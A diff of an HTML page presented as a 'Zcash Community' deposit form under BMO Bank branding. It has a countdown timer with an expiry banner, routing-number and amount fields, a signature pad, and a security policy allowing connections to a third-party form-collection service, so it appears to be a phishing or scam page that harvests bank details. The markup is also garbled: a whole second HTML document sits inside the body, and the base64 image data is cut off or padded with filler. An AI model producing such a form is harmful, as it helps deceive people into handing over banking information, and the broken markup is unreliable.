@@ -1,82 +1,97 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<meta name="theme-color" content="#f97316" />
-<meta name="referrer" content="strict-origin-when-cross-origin" />
-<title>Zcash Community – BMO Bank N.A. Deposit Form</title>
-<style>
-  :root{
-    --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
-    --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
-    --muted:#4b5563; --border:#e5e7eb; --bmo-blue:#003399;
-  }
-  *{box-sizing:border-box}
-  body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
-  .card{max-width:760px;margin:16px auto;background:#fff;border:2px solid var(--orange);border-radius:16px;padding:18px}
-  .header{display:flex;align-items:center;gap:10px;border-bottom:3px solid var(--orange);padding-bottom:12px}
-  .logo{width:42px;height:42px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-weight:900;font-size:24px;flex:0 0 auto}
-  .brand{font-size:28px;font-weight:900;letter-spacing:-0.5px}
-  .verified{color:#2563eb;font-size:22px}
-  .title{text-align:center;margin:14px 0 18px}
-  .kicker{font-size:13px;font-weight:800;letter-spacing:1px;color:#111827}
-  h1{margin:6px 0;font-size:28px;line-height:1.15;letter-spacing:-0.5px}
-  .subtitle{font-size:14px;color:var(--muted);margin-top:4px}
-  .underline{width:92px;height:4px;background:var(--orange);margin:10px auto 0;border-radius:999px}
-  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-  .field{margin-bottom:14px}
-  label{display:block;font-weight:700;margin-bottom:6px;font-size:14px}
-  .hint{font-weight:400;font-size:12px;color:var(--muted);margin-top:-4px;margin-bottom:6px}
-  input,select,textarea{width:100%;border:1px solid var(--border);border-radius:10px;padding:12px;font:inherit;background:#fff;color:var(--text)}
-  textarea{min-height:100px;resize:vertical}
-  input:user-invalid,select:user-invalid,textarea:user-invalid{border-color:#ef4444}
-  input:user-valid,select:user-valid,textarea:user-valid{border-color:#22c55e}
-  .panel{border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;background:#fff}
-  .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
-  .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
-  .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
-  .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
-  .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
-  .bmo-sub{font-size:12px;color:var(--muted)}
-  .timer-bar{
-    display:flex;align-items:center;justify-content:center;gap:8px;
-    background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;
-    border-radius:10px;padding:10px;font-weight:800;font-size:14px;margin-bottom:12px;
-  }
-  .timer-bar.urgent{background:#fef2f2;border-color:#fecaca;color:#991b1b}
-  .time-up-caution{
-    max-width:760px;margin:16px auto;background:#fff;border:2px solid #f59e0b;
-    border-radius:16px;padding:24px;text-align:center;font-size:20px;font-weight:900;color:#92400e;
-  }
-  .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
-  .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
-  input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
-  .routing-group{display:flex;gap:0;align-items:stretch}
-  .routing-group input{border-radius:0;flex:1;text-align:center}
-  .routing-group input:first-child{border-radius:10px 0 0 10px}
-  .routing-group input:last-child{border-radius:0 10px 10px 0}
-  .routing-group .sep{display:flex;align-items:center;padding:0 8px;font-weight:900;color:var(--muted);font-size:18px}
-  .amount-group{display:flex;align-items:center;gap:8px}
-  .amount-group span{font-weight:900;font-size:18px;color:var(--orange)}
-  .amount-group input{flex:1;min-width:0}
-  .declaration{background:var(--green-bg);border:2px solid var(--green-border);border-radius:12px;padding:12px;margin:16px 0}
-  .declaration .check{align-items:flex-start}
-  .declaration .check input{margin-top:2px}
-  .signature-wrap{border:1px solid var(--border);border-radius:12px;padding:10px}
-  .signature-canvas{width:100%;height:140px;border:1px dashed #9ca3af;border-radius:10px;background:#fff;touch-action:none;display:block}
-  #sigHint{margin-top:8px}
-  .btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
-  button{border:0;border-radius:10px;padding:12px 16px;font:inherit;font-weight:800;cursor:pointer}
-  .primary{background:var(--orange);color:#fff;width:100%;min-height:48px}
-  .primary:disabled{background:#9ca3af;cursor:not-allowed}
-  .ghost{background:#f3f4f6;color:#111827}
-  .message{margin-top:12px;padding:12px;border-radius:10px;display:none;font-weight:700;font-size:14px}
-  .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
-  .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
-  footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
-  @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#f97316">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; connect-src 'self' https://usebasin.com;">
+    <title>Zcash Community – BMO Bank N.A. Deposit Form</title>
+    
+    <!-- Modern Tailwind CSS with optimized loading -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        :root{
+            --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
+            --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
+            --muted:#4b5563; --border:#e5e7eb; --bmo-blue:#003399;
+        }
+        *{box-sizing:border-box}
+        body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
+        .card{max-width:760px;margin:16px auto;background:#fff;border:2px solid var(--orange);border-radius:16px;padding:18px}
+        .header{display:flex;align-items:center;gap:10px;border-bottom:3px solid var(--orange);padding-bottom:12px}
+        .logo{width:42px;height:42px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-weight:900;font-size:24px;flex:0 0 auto}
+        .brand{font-size:28px;font-weight:900;letter-spacing:-0.5px}
+        .verified{color:#2563eb;font-size:22px}
+        .title{text-align:center;margin:14px 0 18px}
+        .kicker{font-size:13px;font-weight:800;letter-spacing:1px;color:#111827}
+        h1{margin:6px 0;font-size:28px;line-height:1.15;letter-spacing:-0.5px}
+        .subtitle{font-size:14px;color:var(--muted);margin-top:4px}
+        .underline{width:92px;height:4px;background:var(--orange);margin:10px auto 0;border-radius:999px}
+        .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+        .field{margin-bottom:14px}
+        label{display:block;font-weight:700;margin-bottom:6px;font-size:14px}
+        .hint{font-weight:400;font-size:12px;color:var(--muted);margin-top:-4px;margin-bottom:6px}
+        input,select,textarea{width:100%;border:1px solid var(--border);border-radius:10px;padding:12px;font:inherit;background:#fff;color:var(--text)}
+        textarea{min-height:100px;resize:vertical}
+        input:user-invalid,select:user-invalid,textarea:user-invalid{border-color:#ef4444}
+        input:user-valid,select:user-valid,textarea:user-valid{border-color:#22c55e}
+        .panel{border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;background:#fff}
+        .step{display:flex;align-items:center;gap:10px;font-weight:900;margin:18px 0 10px;font-size:16px}
+        .num{width:28px;height:28px;border-radius:50%;background:var(--orange);color:#fff;display:grid;place-items:center;font-size:14px;flex:0 0 auto}
+        .notice{background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;border-radius:10px;padding:10px;font-size:13px;line-height:1.4;margin-bottom:12px}
+        .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
+        .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
+        .bmo-sub{font-size:12px;color:var(--muted)}
+        .timer-bar{
+            display:flex;align-items:center;justify-content:center;gap:8px;
+            background:var(--orange-light);border:1px solid var(--orange-border);color:#7c2d12;
+            border-radius:10px;padding:10px;font-weight:800;font-size:14px;margin-bottom:12px;
+        }
+        .timer-bar.urgent{background:#fef2f2;border-color:#fecaca;color:#991b1b}
+        .time-up-caution{
+            max-width:760px;margin:16px auto;background:#fff;border:2px solid #f59e0b;
+            border-radius:16px;padding:24px;text-align:center;font-size:20px;font-weight:900;color:#92400e;
+        }
+        .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
+        .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px} 
+        input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
+        .amount-group{display:flex;align-items:center;gap:8px}
+        .amount-group span{font-weight:900;font-size:18px;color:var(--orange)}
+        .amount-group input{flex:1;min-width:0}
+        .declaration{background:var(--green-bg);border:2px solid var(--green-border);border-radius:12px;padding:12px;margin:16px 0}
+        .declaration .check{align-items:flex-start}
+        .declaration .check input{margin-top:2px}
+        .signature-wrap{border:1px solid var(--border);border-radius:12px;padding:10px}
+        .signature-canvas{width:100%;height:140px;border:1px dashed #9ca3af;border-radius:10px;background:#fff;touch-action:none;display:block}
+        #sigHint{margin-top:8px}
+        .btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
+        button{border:0;border-radius:10px;padding:12px 16px;font:inherit;font-weight:800;cursor:pointer}
+        .primary{background:var(--orange);color:#fff;width:100%;min-height:48px}
+        .primary:disabled{background:#9ca3af;cursor:not-allowed}
+        .ghost{background:#f3f4f6;color:#111827}
+        .message{margin-top:12px;padding:12px;border-radius:10px;display:none;font-weight:700;font-size:14px}
+        .success{display:block;background:var(--green-bg);color:#166534;border:1px solid #bbf7d0}
+        .error{display:block;background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
+        footer{text-align:center;color:var(--muted);font-size:12px;margin-top:14px}
+        @media (max-width:560px){.card{margin:10px;padding:14px}.row{grid-template-columns:1fr}h1{font-size:22px}.brand{font-size:24px}}
+        
+        /* Enhanced accessibility and performance */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+        
+        /* Focus styles for better accessibility */
+        :focus-visible {
+            outline: 2px solid var(--orange);
+            outline-offset: 2px;
+        }
+    </style>
 </head>
 <body>
 <div id="timeUpCaution" class="time-up-caution" hidden>⚠️ TIME UP — FORM EXPIRED</div>
@@ -88,12 +103,17 @@
 
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
-    <div class="bmo-banner">
-      <!-- FULL BASE64 — NO TRUNCATION -->
-      <img class="bmo-logo"src="data:image/jpeg;base64,/9j/4QBqRXhpZgAATU0AKgAAAAgABAEBAAMAAAABAaQAAIdpAAQAAAABAAAAPgESAAMAAAABAAEAAAEAAAMAAAABAuAAAAAAAAAAApIIAAQAAAABAAAAAIiwAAEAAAABAAAAAAAAAAAAAAAAAAD/5AAwWElBT01JX0NVU1RPTVlaRQABAXsiODhiMCI6IjAiLCJ2ZXJzaW9uIjoiMzIiff/gABBKRklGAAEBAAABAAEAAP/iAdhJQ0NfUFJPRklMRQABAQAAAcgAAAAABDAAAG1udHJSR0IgWFlaIAfgAAEAAQAAAAAAAGFjc3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAD21gABAAAAANMtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACWRlc2MAAADwAAAAJHJYWVoAAAEUAAAAFGdYWVoAAAEoAAAAFGJYWVoAAAE8AAAAFHd0cHQAAAFQAAAAFHJUUkMAAAFkAAAAKGdUUkMAAAFkAAAAKGJUUkMAAAFkAAAAKGNwcnQAAAGMAAAAPG1sdWMAAAAAAAAAAQAAAAxlblVTAAAACAAAABwAcwBSAEcAQgBoAFkAVwBpAEEAAAAAAAB2AGgAAAAAAAEA <div class="bmo-sub">Bank of Montreal – United States</div>
-    </div>
-
-    <div id="countdownBar" class="timer-bar" role="timer" aria-live="polite">
+    <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BMO Logo</title>
+</head>
+<body>
+  <img
+    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAM/BgADASIAAhEBAxEB/8QAHQABAAIDAAMBAAAAAAAAAAAAAAECAwgJBQYHBP/EAFMQAQABAwIEAwQDCA4JAgYDAQABAgMRBAUGEiExBwhBEyJRcTJhsQkUFjdzgZGSFRc0NkJSVFVygpOhstEYIyQzRWJjdMEmgyUnNUNEU2Th8KL/xAAdAQEAAQUBAQEAAAAAAAAAAAAAAQIFBgcIAwQJ/8QAOREBAAIBAwMCBAQEBgMAAgMAAAECAwQFEQYhMRJBBxMiUTI0YXEUFRYzFyM1U4GxJEJSkaElQ2L/2gAMAwEAAhEDEQA/AOqYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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